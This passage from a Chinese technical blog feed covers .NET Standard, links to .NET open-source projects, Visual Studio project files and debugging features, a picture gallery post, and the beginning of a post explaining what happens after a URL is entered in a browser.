href="https://news.cnblogs.com/n/508410/" target="_blank" rel="noopener">https://news.cnblogs.com/n/508410/</a>  </p>
<h2 id="NET-Standard是什么"><a href="#NET-Standard是什么" class="headerlink" title=".NET Standard是什么"></a>.NET Standard是什么</h2><p>&emsp;&emsp;值得一提的是微软还为BCL提出了一个标准，毕竟各式各样的平台，技术层出不穷，为了防止.NET在类库方面的碎片化，即提出了一套正式的 .NET API (.NET 的应用程序编程接口)规范，.NET Standard。<br>&emsp;&emsp;正如上面CLS一样，.NET Standard就类似于这样的一个概念，无论是哪个托管框架，我们遵循这个标准，就能始终保持在BCL的统一性，即我不需要关心我是用的.NET Framework还是.NET Core，只要该类被定义于.NET Standard中，我就一定能在对应支持的.NET Standard的版本的托管框架中找到它。<br><img src="1026815-20180627092519198-1182560984.png" alt=" "><br>&emsp;&emsp;.NET Standard： <a href="https://docs.microsoft.com/zh-cn/dotnet/standard/net-standard#net-implementation-support" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/net-standard#net-implementation-support</a><br>&emsp;&emsp;.NET Standard开源代码：<a href="https://github.com/dotnet/standard" target="_blank" rel="noopener">https://github.com/dotnet/standard</a>  </p>
<h2 id="NET官方开源项目链接"><a href="#NET官方开源项目链接" class="headerlink" title=".NET官方开源项目链接"></a>.NET官方开源项目链接</h2><p>&emsp;&emsp;现在我将给出.NET相关的开源项目地址：  </p>
<p>&emsp;&emsp;参与.NET和.NET开源项目的起点：<a href="https://github.com/Microsoft/dotnet" target="_blank" rel="noopener">https://github.com/Microsoft/dotnet</a>  </p>
<ul>
<li>.NET Core：<a href="https://github.com/dotnet/core" target="_blank" rel="noopener">https://github.com/dotnet/core</a></li>
<li>.NET Core文档：<a href="https://github.com/dotnet/docs" target="_blank" rel="noopener">https://github.com/dotnet/docs</a></li>
<li>ASP.NET Core：<a href="https://github.com/aspnet/home" target="_blank" rel="noopener">https://github.com/aspnet/home</a></li>
<li>ASP.NET Core文档：<a href="https://github.com/aspnet/Docs" target="_blank" rel="noopener">https://github.com/aspnet/Docs</a></li>
<li>EntityFramework Core框架:<a href="https://github.com/aspnet/EntityFrameworkCore" target="_blank" rel="noopener">https://github.com/aspnet/EntityFrameworkCore</a></li>
<li>ASP.NET Core MVC框架：<a href="https://github.com/aspnet/Mvc" target="_blank" rel="noopener">https://github.com/aspnet/Mvc</a></li>
<li>EntityFramework6:<a href="https://github.com/aspnet/EntityFramework6" target="_blank" rel="noopener">https://github.com/aspnet/EntityFramework6</a></li>
<li>.NET Framework源码：<a href="https://github.com/microsoft/referencesource" target="_blank" rel="noopener">https://github.com/microsoft/referencesource</a></li>
<li>.NET Core基类库：<a href="https://github.com/dotnet/corefx" target="_blank" rel="noopener">https://github.com/dotnet/corefx</a></li>
<li>.NET Core CLR：<a href="https://github.com/dotnet/coreclr" target="_blank" rel="noopener">https://github.com/dotnet/coreclr</a></li>
<li>Roslyn编译器：<a href="https://github.com/dotnet/roslyn" target="_blank" rel="noopener">https://github.com/dotnet/roslyn</a></li>
<li>MVC5、Web API2、Web Pages3框架源码：<a href="https://github.com/aspnet/AspNetWebStack" target="_blank" rel="noopener">https://github.com/aspnet/AspNetWebStack</a></li>
<li>.NET Standard：<a href="https://github.com/dotnet/standard" target="_blank" rel="noopener">https://github.com/dotnet/standard</a></li>
<li>KestrelHttpServer用于ASP.NET Core的跨平台Web服务器：<a href="https://github.com/aspnet/KestrelHttpServer" target="_blank" rel="noopener">https://github.com/aspnet/KestrelHttpServer</a></li>
<li>Visual Studio Code源码：<a href="https://github.com/Microsoft/vscode" target="_blank" rel="noopener">https://github.com/Microsoft/vscode</a></li>
<li>一些优秀的.NET库、工具、框架、软件开源集合：<a href="https://github.com/quozd/awesome-dotnet" target="_blank" rel="noopener">https://github.com/quozd/awesome-dotnet</a></li>
<li>一些常用框架对ASP.NET Core和.NET Core的支持报告：<a href="https://github.com/jpsingleton/ANCLAFS" target="_blank" rel="noopener">https://github.com/jpsingleton/ANCLAFS</a> </li>
<li>一些.NET下用于支持开发的开源项目集合：<a href="https://github.com/Microsoft/dotnet/blob/master/dotnet-developer-projects.md" target="_blank" rel="noopener">https://github.com/Microsoft/dotnet/blob/master/dotnet-developer-projects.md</a> </li>
<li>微软出品的分布式框架orleans：<a href="https://github.com/dotnet/orleans" target="_blank" rel="noopener">https://github.com/dotnet/orleans</a></li>
<li>ML.NET 用于.NET的开源和跨平台机器学习框架：<a href="https://github.com/dotnet/machinelearning" target="_blank" rel="noopener">https://github.com/dotnet/machinelearning</a></li>
</ul>
<h1 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h1><p>&emsp;&emsp;在文章最后，我还要简单的说下Visual Studio。<br>&emsp;&emsp;通过上文得知，只需要一个txt记事本+csc.exe我们就可以开发出一个.NET程序，那么与之相比，.NET提供的开发工具VS有什么不同呢？<br>&emsp;&emsp;我们用记事本+csc.exe来编写一个.NET程序只适合小打小闹，对于真正要开发一个项目而言，我们需要文件管理、版本管理、一个好的开发环境等。而vs ide则就是这样一个集成代码编辑、编译、调试、追踪、测试、部署、协作、插件扩展这样多个组件的集成开发环境，csc.exe的编译功能只是vs ide中的其中之一。使用vside开发可以节省大量的开发时间和成本。  </p>
<h2 id="sln解决方案"><a href="#sln解决方案" class="headerlink" title="sln解决方案"></a>sln解决方案</h2><p>&emsp;&emsp;当你用VS来新建一个项目时，VS会先为你新建一个整体的解决方案。这个解决方案表现为.sln和.suo后缀格式的文件，它们均是文本文件，对解决方案右键属性可以进行相应的修改，也可以直接用记事本打开。<br>&emsp;&emsp;在sln中，定义了解决方案的版本及环境，如包含的项目，方案启动项，生成或部署的一些项目配置等，你可以通过修改或重新定义sln来更改你的整个解决方案。<br>&emsp;&emsp;而suo则包含于解决方案建立关联的选项，相当于快照，储存了用户界面的自定义配置、调试器断点、观察窗口设置等这样的东西，它是隐藏文件，可删除但建议不要删除。<br>&emsp;&emsp;我们可以通过对比各版本之间的sln来修改sln,也可以使用网上的一些转换工具，也可以直接点击VS的文件-新建-从现有代码创建项目来让项目在不同VS版本间切换。<br>&emsp;&emsp;Visual Studio 2010 - # Visual Studio 4.0<br>&emsp;&emsp;Visual Studio 2012 - # Visual Studio 4.0<br>&emsp;&emsp;Visual Studio 2013 - # Visual Studio 12.00<br>&emsp;&emsp;Visual Studio 2015 - # Visual Studio 14<br>&emsp;&emsp;Visual Studio 2017 - # Visual Studio 15  </p>
<h2 id="项目模板"><a href="#项目模板" class="headerlink" title="项目模板"></a>项目模板</h2><p>&emsp;&emsp;VS使用项目模板来基于用户的选择而创建新的项目，也就是新建项目中的那些展示项(如mvc5项目/winform项目等等)，具体表现为包含<code>.vstemplate</code>及一些定义的关联文件这样的母版文件。将这些文件压缩为一个 <code>.zip</code> 文件并放在正确的文件夹中时，就会在展示项中予以显示。<br>&emsp;&emsp;用户可以创建或自定义项目模板，也可以选择现有的模板，比如我创建一个控制台项目就会生成一个在<code>.vstemplate</code>中定义好的<code>Program.cs</code>、<code>AssemblyInfo.cs</code>(程序集级别的特性)、<code>App.config</code>、<code>ico</code>、<code>csproj</code>文件<br><img src="1026815-20180627092814795-1540367679.png" alt=" ">  </p>
<h2 id="csproj工程文件"><a href="#csproj工程文件" class="headerlink" title="csproj工程文件"></a>csproj工程文件</h2><p>&emsp;&emsp;这里面，csproj是我们最常见的核心文件，CSharp Project，它是用于构建这个项目的工程文件。<br>&emsp;&emsp;csproj是基于xml格式的MSBuild项目文件，其仍然是文本文件，可以打开并修改定义了的工程构造的属性，比如选择性的添加或删除或修改包含在项目中的文件或引用、修改项目版本、将其转换为其它类型项目等。<br>&emsp;&emsp;MSBuild是微软定义的一个用于生成应用程序的平台(Microsoft Build Engine)，在这里为VS提供了项目的构造系统，在微软官方文档上有着详细的说明：<a href="https://msdn.microsoft.com/zh-cn/library/dd393573.aspx、https://docs.microsoft.com/zh-cn/visualstudio/msbuild/msbuild" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/dd393573.aspx、https://docs.microsoft.com/zh-cn/visualstudio/msbuild/msbuild</a>  </p>
<h2 id="项目属性杂项"><a href="#项目属性杂项" class="headerlink" title="项目属性杂项"></a>项目属性杂项</h2><p>&emsp;&emsp;现在，简单说明一下csproj文件的一些核心元素。我们用vs新建一个控制台项目，然后对项目右键属性打开项目属性，在应用程序页我们可以定义：程序集名称(生成出来的程序集以程序集名称作为文件名，相当于csc中的/out)、默认命名空间(每次新建类里面显示的命名空间)、目标框架、应用程序类型、程序集信息(AssemblyInfo中的信息)、启动对象(可同时存在多个Main方法，需指定其中一个为入口对象)、程序集资源(一些可选的图标及文件)  </p>
<ol>
<li><p>在生成页有：  </p>
<ul>
<li>条件编译符号(全局的预编译#define指令，不用在每个文件头部定义，相当于csc中的/define)</li>
<li>定义DEBUG/TRACE常量(用于调试输出的定义变量，如智能追踪的时候可以输出该变量)</li>
<li>目标平台(指定当前面向什么处理器生成的程序集，相当于csc中的/platform。选择x86则生成的程序集生成32位程序，能在32/64位Intel处理器中使用。选择x64则生成64位，只能在64位系统中运行。选择Any CPU则32位系统生成32位，64位系统则生成64位。注意：编译平台和目标调用平台必须保持一致，否则报错。生成的32位程序集不能调用64位程序集，64位也不能调用32位)、首选32位(如果目标平台是Any CPU并且项目是应用程序类型，则生成的是32位程序集)</li>
<li>允许不安全代码(unsafe开关，在c#中进行指针编程，如调换a方法和b方法的地址)</li>
<li>优化代码(相当于csc中的/optimize，优化IL代码让调试难以进行，优化JIT代码)</li>
<li>输出路径(程序集输出目录，可选择填写相对路径目录或绝对路径目录)</li>
<li>XML文档文件(相当于csc中的/doc，为程序集生成文档注释文件，浏览对方程序集对象就可以看到相关注释，VS的智能提示技术就运用于此)</li>
<li>为COM互操作注册(指示托管应用程序将公开一个 COM 对象,使COM对象可以与托管应用程序进行交互)</li>
</ul>
</li>
<li><p>在高级生成设置中有:语言版本(可以选择C#版本)、调试信息(相当于csc中的/debug。选择none则不生成任何调试信息，无法调试。选择full则允许将调试器附加到运行程序，生成pdb调试文件。选择pdb-only，自.NET2.0开始与full选项完全相同，生成相同的pdb调试文件。)、文件对齐(指定输出文件中节的大小)、DLL基址(起点地址)  </p>
</li>
<li><p>在生成事件选项中可以设置生成前和生产后执行的命令行，我们可以执行一些命令。  </p>
</li>
<li><p>在调试选项中有一栏叫：启用Visual Studio承载进程，通过在vshost.exe中加载运行项目程序集，这个选项可以增加程序的调试性能，启用后会自动在输出目录生成{程序集名称}.vshost.exe这样一个文件，只有当当前项目不是启动项目的时候才能删除该文件。  </p>
</li>
</ol>
<h2 id="IntelliTrace智能追溯"><a href="#IntelliTrace智能追溯" class="headerlink" title="IntelliTrace智能追溯"></a>IntelliTrace智能追溯</h2><p>&emsp;&emsp;还要介绍一点VS的是，其IntelliTrace智能追溯功能，该功能最早存在于VS2010旗舰版，是我用的最舒服的一个功能。<br>&emsp;&emsp;简单介绍，该功能是用来辅助调试的，在调试时可以让开发人员了解并追溯代码所产生的一些事件，并且能够进行回溯以查看应用程序中发生的情形，它是一个非常强大的调试追踪器，它可以捕捉由你代码产生的事件，如异常事件、函数调用(从入口)、ADO.NET的命令(Sql查询语句…)、ASP.NET相关事件、代码发送的HTTP请求、程序集加载卸载事件、文件访问打开关闭事件、Winform/Webform/WPF动作事件、线程事件、环境变量、Console/Trace等输出…<br>&emsp;&emsp;我们可以通过在调试状态下点击调试菜单-窗口-显示诊断工具，或者直接按<code>Ctrl+Alt+F2</code>来唤起该功能窗口。<br><img src="1026815-20180627093009099-519860392.png" alt=" "><br>&emsp;&emsp;当然，VS还有其它强大的功能，我建议大家依次点完 菜单项中的 调试、体系结构、分析这三个大菜单里面的所有项，你会发现VS真是一个强大的IDE。比较实用且方便的功能举几个例子：<br>&emsp;&emsp;比如 从代码生成的序列图，该功能在vs2015之前的版本可以找到(<a href="https://msdn.microsoft.com/en-us/library/dd409377.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/dd409377.aspx</a> 、<a href="https://www.zhihu.com/question/36413876" target="_blank" rel="noopener">https://www.zhihu.com/question/36413876</a>)<br><img src="1026815-20180627093037839-1150553069.png" alt=" "><br>&emsp;&emsp;比如 模块关系的代码图，可以看到各模块间的关系<br><img src="1026815-20180627093124326-512090758.png" alt=" "><br>&emsp;&emsp;比如 对解决方案的代码度量分析结果<br><img src="1026815-20180627093148912-1896119331.png" alt=" "><br>&emsp;&emsp;比如 调试状态下 函数调用的 代码图，我们可以看到MVC框架的函数管道模型<br><img src="1026815-20180627093233279-525978653.png" alt=" "><br>&emsp;&emsp;以及并行堆栈情况、加载的模块、线程的实际情况<br><img src="1026815-20180627093315515-525631630.png" alt=" ">  </p>
<figure class="image-box">
                <img src="1026815-20180627093342703-1181912035.png" alt title class>
                <p></p>
            </figure>  
<figure class="image-box">
                <img src="1026815-20180627093350454-462024400.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;还有如进程、内存、反汇编、寄存器等的功能，这里不再一一展示  </p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>&emsp;&emsp;有关解决方案：<a href="https://msdn.microsoft.com/zh-cn/library/b142f8e7(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/b142f8e7(v=vs.110).aspx</a><br>&emsp;&emsp;有关项目模板： <a href="https://msdn.microsoft.com/zh-cn/library/ms247121(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms247121(v=vs.110).aspx</a><br>&emsp;&emsp;有关项目元素的说明介绍：<a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/16satcwx(v%3dvs.100)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/16satcwx(v%3dvs.100)</a><br>&emsp;&emsp;有关调试更多内容：<a href="https://docs.microsoft.com/zh-cn/visualstudio/debugger/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/visualstudio/debugger/</a><br>&emsp;&emsp;有关代码设计建议：<a href="https://docs.microsoft.com/zh-cn/visualstudio/code-quality/code-analysis-for-managed-code-warnings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/visualstudio/code-quality/code-analysis-for-managed-code-warnings</a><br>&emsp;&emsp;有关IntelliTrace介绍：<a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/dd264915(v%3dvs.100)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/dd264915(v%3dvs.100)</a>  </p>
<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>&emsp;&emsp;我热爱编程。<br>&emsp;&emsp;我知道大多数人对技术的积累都是来自于平常工作中，工作中用到的就去学，用不到就不学，学一年的知识，然后用个五六年。<br>&emsp;&emsp;我也能理解人的理想和追求不同，有的人可能就想平淡点生活。有的人可能是过了拼劲，习惯了安逸。有的人已经认命了。<br>&emsp;&emsp;而我现在也每天饱满工作没多少时间，但在下班之余我仍然坚持每天都看一看书。<br>&emsp;&emsp;想学没时间学，想拼不知道往哪拼。有埋汰自己脑袋笨的，有说自己不感兴趣的。有明明踌躇满志，但总三天捕鱼两天晒网的。我身边的朋友大多都这样。<br>&emsp;&emsp;我想说，尽管我们每个人的境遇、思想、规划不同，但我肯定大家大部分是出于生计而工作。<br>&emsp;&emsp;而出于生计，那就是为了自己。而既然是为了自己，那就别每天浑浑噩噩过，即使你因各种原因而没有斗志。<br>&emsp;&emsp;编程来不得虚的，如果你没走上管理，那么你的技术好就是好，不好就是不好，混不得，一分技术一分钱。自己不扎实，你运气就不可能太好。<br>&emsp;&emsp;技术是相通的，操作系统、通信、数据结构、协议标准、技术规范、设计模式，语言只是门工具。要知其然也要知其所以然，只知道1个梨+1个梨=2个梨，不知道1个苹果+1个苹果等于啥就悲剧了。<br>&emsp;&emsp;那怎样提升自己？肯定不能像之前那样被动的去学习了。<br>&emsp;&emsp;光靠工作中的积累带来的提升是没有多少。你不能靠1年的技术重复3年的劳动，自己不想提升就不能怨天尤人。<br>&emsp;&emsp;上班大家都一样，我认为成功与否取决于你的业余时间。你每天下班无论再苦都要花一个小时来学习，学什么都行，肯定能改变你的人生轨迹。<br>&emsp;&emsp;比如你每天下班后都用一小时来学一个概念或技术点，那么300天就是300个概念或者技术点，这是何等的恐怖。<br>&emsp;&emsp;当然，这里的学要有点小方法小技巧的。不能太一条道摸到黑的那种，虽然这样最终也能成功，并且印象还深刻，但是总归效率是有点低的。<br>&emsp;&emsp;比如你从网上下载个项目源码，你项目结构不知道，该项目运用技术栈也不太了解，就一点一点的开始解读。这是个提升的好方法，但这样很累，可以成功，但是很慢。见的多懂的少，往往会因为一个概念上的缺失而在一个细小的问题上浪费很长时间。或者说一直漫无目的的看博客来了解技术，那样获取的知识也不系统。<br>&emsp;&emsp;我的建议是读书，书分两类，一类是 讲底层概念的 一类是 讲上层技术实现的。<br>&emsp;&emsp;可以先从上层技术实现的书读起(如何连接数据库、如何写网页、如何写窗体这些)。在有一定编程经验后就从底层概念的书开始读，操作系统的、通信的、数据库的、.NET相关组成的这些…<br>&emsp;&emsp;读完之后再回过头读这些上层技术的书就会看的更明白更透彻，最后再琢磨git下来的项目就显得轻松了。<br>&emsp;&emsp;就.NET CLR组成这一块中文书籍比较少，由浅到深推荐的书有 你必须知道的.NET(挺通俗)，CLR C#(挺通俗，进阶必看)，如果你想进一步了解CLR，可以看看园子里 包建强 <a href="http://www.cnblogs.com/Jax/archive/2009/05/25/1488835.html" target="_blank" rel="noopener">http://www.cnblogs.com/Jax/archive/2009/05/25/1488835.html</a> 和中道学友 <a href="http://www.cnblogs.com/awpatp/archive/2009/11/11/1601397.html" target="_blank" rel="noopener">http://www.cnblogs.com/awpatp/archive/2009/11/11/1601397.html</a> 翻译的书籍及文章，当然如果你英语合格的话也可以直接阅读他们翻译的来源书籍，我这里有Expert .NET 2.0 IL Assembler的机器翻译版，同时我也建议从调试的方面入手，如 NET高级调试(好多.NET文件调试、反编译的文章都是参考这本书和Apress.Expert.dot.NET.2.0.IL.Assembler(这本书我有机器翻译版)的内容)或者看看Java的JVM的文章。<br>&emsp;&emsp;欢迎加群和我交流(书籍我都放在群文件里了)  </p>
<p>&emsp;&emsp;现在技术发展很快，我建议大家有基础的可以直接看官方文档，(详细链接我已经在各小节给出)以下是部分常用总链接：<br>&emsp;&emsp;asp.net指南：<a href="https://docs.microsoft.com/zh-cn/aspnet/#pivot=core" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/aspnet/#pivot=core</a><br>&emsp;&emsp;Visual Studio IDE 指南：<a href="https://docs.microsoft.com/zh-cn/visualstudio/ide/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/visualstudio/ide/</a><br>&emsp;&emsp;C# 指南： <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/csharp/</a><br>&emsp;&emsp;.NET指南：<a href="https://docs.microsoft.com/zh-cn/dotnet/standard/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/</a><br>&emsp;&emsp;微软开发文档：<a href="https://docs.microsoft.com/zh-cn/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/</a>  </p>
<p>&emsp;&emsp;最后送给大家我经常做的两句话：  </p>
<ol>
<li>先问是不是，再问怎样做，最后我一定会问 为什么  </li>
<li>没人比谁差多少，相信自己，坚持不断努力，你也能成功  </li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[图册]]></title>
      <url>/2019/11/10/Pictures/</url>
      <content type="html"><![CDATA[<p>&emsp;</p>
<a id="more"></a>


<h1 id="Nintendo-Switch"><a href="#Nintendo-Switch" class="headerlink" title="Nintendo Switch"></a>Nintendo Switch</h1><figure class="image-box">
                <img src="NS20171101-20180501.jpg" alt="2017.11.01 - 2018.05.01" title class>
                <p>2017.11.01 - 2018.05.01</p>
            </figure>  
<figure class="image-box">
                <img src="NS20171101-20190112.jpg" alt="2017.11.01 - 2019.01.12" title class>
                <p>2017.11.01 - 2019.01.12</p>
            </figure>  
<figure class="image-box">
                <img src="NS20171101-20191101.jpg" alt="2017.11.01 - 2019.11.01" title class>
                <p>2017.11.01 - 2019.11.01</p>
            </figure>  
<figure class="image-box">
                <img src="NS20171101-20201212.jpg" alt="2017.11.01 - 2020.12.12" title class>
                <p>2017.11.01 - 2020.12.12</p>
            </figure>  

<h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><figure class="image-box">
                <img src="设计模式.png" alt="设计模式" title class>
                <p>设计模式</p>
            </figure>

<figure class="image-box">
                <img src="CQRS架构.png" alt="CQRS 架构" title class>
                <p>CQRS 架构</p>
            </figure>

<figure class="image-box">
                <img src="微服务框架基本功能.png" alt="微服务框架基本功能" title class>
                <p>微服务框架基本功能</p>
            </figure>

<figure class="image-box">
                <img src="排序算法.webp" alt="排序算法" title class>
                <p>排序算法</p>
            </figure>

<figure class="image-box">
                <img src="UML类图.webp" alt="UML 类图" title class>
                <p>UML 类图</p>
            </figure>

<figure class="image-box">
                <img src="python3-in-one-pic.png" alt="一图了解 Python 3 (https://github.com/coodict/python3-in-one-pic)" title class>
                <p>一图了解 Python 3 (https://github.com/coodict/python3-in-one-pic)</p>
            </figure>

<figure class="image-box">
                <img src="Python代码调试清单.jpg" alt="Python代码调试清单" title class>
                <p>Python代码调试清单</p>
            </figure>  

<p><img src="js-in-one-pic.png" alt="一图了解 JavaScript (https://github.com/coodict/javascript-in-one-pic)"></p>
<figure class="image-box">
                <img src="OAuth一张图解释.jpg" alt="OAuth 一张图解释" title class>
                <p>OAuth 一张图解释</p>
            </figure>

<h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><figure class="image-box">
                <img src="图例.png" alt="图例" title class>
                <p>图例</p>
            </figure>

<figure class="image-box">
                <img src="抽象数据结构的操作复杂度.png" alt="抽象数据结构的操作复杂度" title class>
                <p>抽象数据结构的操作复杂度</p>
            </figure>

<figure class="image-box">
                <img src="数组排序.png" alt="数组排序" title class>
                <p>数组排序</p>
            </figure>

<figure class="image-box">
                <img src="图操作.png" alt="图操作" title class>
                <p>图操作</p>
            </figure>

<figure class="image-box">
                <img src="堆操作.png" alt="堆操作" title class>
                <p>堆操作</p>
            </figure>

<figure class="image-box">
                <img src="大-O复杂度曲线.png" alt="大-O 复杂度曲线" title class>
                <p>大-O 复杂度曲线</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[在浏览器输入 URL 回车之后发生了什么]]></title>
      <url>/2019/09/06/WhatHappensWhenYouTypeURLIntoYourBrowserAndPressEnter/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://4ark.me/post/b6c7c0a2.html" target="_blank" rel="noopener">https://4ark.me/post/b6c7c0a2.html</a></p>
</blockquote>
<a id="more"></a>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这个问题已经是老生常谈了，更是经常被作为面试的压轴题出现，网上也有很多文章，但最近闲的无聊，然后就自己做了一篇笔记，感觉比之前理解更透彻了。<br>&emsp;&emsp;这篇笔记是我这两天看了数十篇文章总结出来的，所以相对全面一点，但由于我是做前端的，所以会比较重点分析浏览器渲染页面那一部分，至于其他部分我会罗列出关键词，感兴趣的可以自行查阅  </p>
<p>&emsp;&emsp;<strong>注意</strong>：本文的步骤是建立在，请求的是一个简单的 HTTP 请求，没有 HTTPS、HTTP2、最简单的 DNS、没有代理、并且服务器没有任何问题的基础上，尽管这是不切实际的。  </p>
<h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><ol>
<li>URL 解析</li>
<li>DNS 查询</li>
<li>TCP 连接</li>
<li>处理请求</li>
<li>接受响应</li>
<li>渲染页面</li>
</ol>
<h1 id="一、URL-解析"><a href="#一、URL-解析" class="headerlink" title="一、URL 解析"></a>一、URL 解析</h1><h2 id="地址解析："><a href="#地址解析：" class="headerlink" title="地址解析："></a>地址解析：</h2><p>&emsp;&emsp;首先判断你输入的是一个合法的 URL 还是一个待搜索的关键词，并且根据你输入的内容进行自动完成、字符编码等操作。</p>
<h2 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h2><p>&emsp;&emsp;由于安全隐患，会使用 HSTS 强制客户端使用 HTTPS 访问页面。详见：<a href="https://www.barretlee.com/blog/2015/10/22/hsts-intro/" target="_blank" rel="noopener">你所不知道的 HSTS</a>。</p>
<h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><p>&emsp;&emsp;浏览器还会进行一些额外的操作，比如安全检查、访问限制（之前国产浏览器限制 996.icu）。</p>
<h2 id="检查缓存"><a href="#检查缓存" class="headerlink" title="检查缓存"></a>检查缓存</h2><figure class="image-box">
                <img src="检查缓存.png" alt title class>
                <p></p>
            </figure>

<h1 id="二、DNS-查询"><a href="#二、DNS-查询" class="headerlink" title="二、DNS 查询"></a>二、DNS 查询</h1><h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><figure class="image-box">
                <img src="DNS查询.png" alt title class>
                <p></p>
            </figure>
<h2 id="1-浏览器缓存"><a href="#1-浏览器缓存" class="headerlink" title="1. 浏览器缓存"></a>1. 浏览器缓存</h2><p>&emsp;&emsp;浏览器会先检查是否在缓存中，没有则调用系统库函数进行查询。</p>
<h2 id="2-操作系统缓存"><a href="#2-操作系统缓存" class="headerlink" title="2. 操作系统缓存"></a>2. 操作系统缓存</h2><p>&emsp;&emsp;操作系统也有自己的 DNS缓存，但在这之前，会向检查域名是否存在本地的 Hosts 文件里，没有则向 DNS 服务器发送查询请求。</p>
<h2 id="3-路由器缓存"><a href="#3-路由器缓存" class="headerlink" title="3. 路由器缓存"></a>3. 路由器缓存</h2><p>&emsp;&emsp;路由器也有自己的缓存。</p>
<h2 id="4-ISP-DNS-缓存"><a href="#4-ISP-DNS-缓存" class="headerlink" title="4. ISP DNS 缓存"></a>4. ISP DNS 缓存</h2><p>&emsp;&emsp;ISP DNS 就是在客户端电脑上设置的首选 DNS 服务器，它们在大多数情况下都会有缓存。</p>
<h2 id="根域名服务器查询"><a href="#根域名服务器查询" class="headerlink" title="根域名服务器查询"></a>根域名服务器查询</h2><p>&emsp;&emsp;在前面所有步骤没有缓存的情况下，本地 DNS 服务器会将请求转发到互联网上的根域，下面这个图很好的诠释了整个流程：</p>
<figure class="image-box">
                <img src="DNS根域名服务器查询.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>根域名服务器：<a href="https://zh.wikipedia.org/wiki/%E6%A0%B9%E7%B6%B2%E5%9F%9F%E5%90%8D%E7%A8%B1%E4%BC%BA%E6%9C%8D%E5%99%A8" target="_blank" rel="noopener">维基百科</a></p>
</blockquote>
<h2 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h2><ol>
<li>递归方式：一路查下去中间不返回，得到最终结果才返回信息（浏览器到本地DNS服务器的过程）</li>
<li>迭代方式，就是本地DNS服务器到根域名服务器查询的方式。</li>
<li>什么是 DNS 劫持</li>
<li>前端 dns-prefetch 优化</li>
</ol>
<h1 id="三、TCP-连接"><a href="#三、TCP-连接" class="headerlink" title="三、TCP 连接"></a>三、TCP 连接</h1><p>&emsp;&emsp;TCP/IP 分为四层，在发送数据时，每层都要对数据进行封装：<br><img src="TCP%E8%BF%9E%E6%8E%A5.png" alt=" "></p>
<h2 id="1-应用层：发送-HTTP-请求"><a href="#1-应用层：发送-HTTP-请求" class="headerlink" title="1. 应用层：发送 HTTP 请求"></a>1. 应用层：发送 HTTP 请求</h2><p>&emsp;&emsp;在前面的步骤我们已经得到服务器的 IP 地址，浏览器会开始构造一个 HTTP 报文，其中包括：</p>
<ul>
<li>请求报头（Request Header）：请求方法、目标地址、遵循的协议等等</li>
<li>请求主体（其他参数）</li>
</ul>
<p>&emsp;&emsp;其中需要注意的点：</p>
<ul>
<li>浏览器只能发送 GET、POST 方法，而打开网页使用的是 GET 方法</li>
</ul>
<h2 id="2-传输层：TCP-传输报文"><a href="#2-传输层：TCP-传输报文" class="headerlink" title="2. 传输层：TCP 传输报文"></a>2. 传输层：TCP 传输报文</h2><p>&emsp;&emsp;传输层会发起一条到达服务器的 TCP 连接，为了方便传输，会对数据进行分割（以报文段为单位），并标记编号，方便服务器接受时能够准确地还原报文信息。<br>&emsp;&emsp;在建立连接前，会先进行 TCP 三次握手。</p>
<blockquote>
<p>关于 TCP/IP 三次握手，网上已经有很多段子和图片生动地描述了。<br>相关知识点：<br>&emsp;&emsp;SYN 泛洪攻击</p>
</blockquote>
<h2 id="3-网络层：IP协议查询Mac地址"><a href="#3-网络层：IP协议查询Mac地址" class="headerlink" title="3. 网络层：IP协议查询Mac地址"></a>3. 网络层：IP协议查询Mac地址</h2><p>&emsp;&emsp;将数据段打包，并加入源及目标的IP地址，并且负责寻找传输路线。<br>&emsp;&emsp;判断目标地址是否与当前地址处于同一网络中，是的话直接根据 Mac 地址发送，否则使用路由表查找下一跳地址，以及使用 ARP 协议查询它的 Mac 地址。</p>
<blockquote>
<p>注意：在 OSI 参考模型中 ARP 协议位于链路层，但在 TCP/IP 中，它位于网络层。</p>
</blockquote>
